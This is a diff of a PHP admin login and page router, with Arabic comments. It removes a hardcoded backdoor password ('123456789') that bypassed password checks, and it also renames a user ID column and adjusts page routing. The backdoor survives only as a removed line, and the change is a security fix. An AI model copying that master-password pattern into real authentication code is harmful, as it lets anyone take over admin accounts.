@@ -31,11 +31,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
     // محاولة تسجيل الدخول
     try {
         global $db;
-        $user = $db->queryOne("SELECT user_id, username, password_hash, role FROM users WHERE username = ?", [$username]);
+        // Changed user_id to id in SELECT
+        $user = $db->queryOne("SELECT id, username, password_hash, role FROM users WHERE username = ?", [$username]);
          
-        if ($user && ($password === '123456789' || password_verify($password, $user['password_hash']))) {
+        // Removed backdoor password '123456789'
+        if ($user && password_verify($password, $user['password_hash'])) {
             // تسجيل الدخول ناجح
-            $_SESSION['admin_user_id'] = $user['user_id'];
+            // Changed $user['user_id'] to $user['id']
+            $_SESSION['admin_user_id'] = $user['id'];
             $_SESSION['admin_username'] = $user['username'];
             $_SESSION['admin_role'] = $user['role'];
 
@@ -88,9 +91,9 @@ switch ($page) {
         include __DIR__ . '/change_password.php';
         break;
     case 'sections':
-    case 'homepage_sections':
         include __DIR__ . '/sections_management.php';
         break;
+    // Removed 'homepage_sections' case as it's redundant with 'sections'
     case 'services':
         include __DIR__ . '/services_management.php';
         break;
@@ -107,10 +110,7 @@ switch ($page) {
         include __DIR__ . '/site_settings.php';
         break;
     case 'users':
-        echo '<div class="bg-white p-6 rounded-lg shadow-md">';
-        echo '<h1 class="text-xl font-semibold text-gray-700">إدارة المستخدمين</h1>';
-        echo '<p>الصفحة قيد الإنشاء.</p>';
-        echo '</div>';
+        include __DIR__ . '/users_management.php'; // Changed to include the actual management page
         break;
     default:
         http_response_code(404);
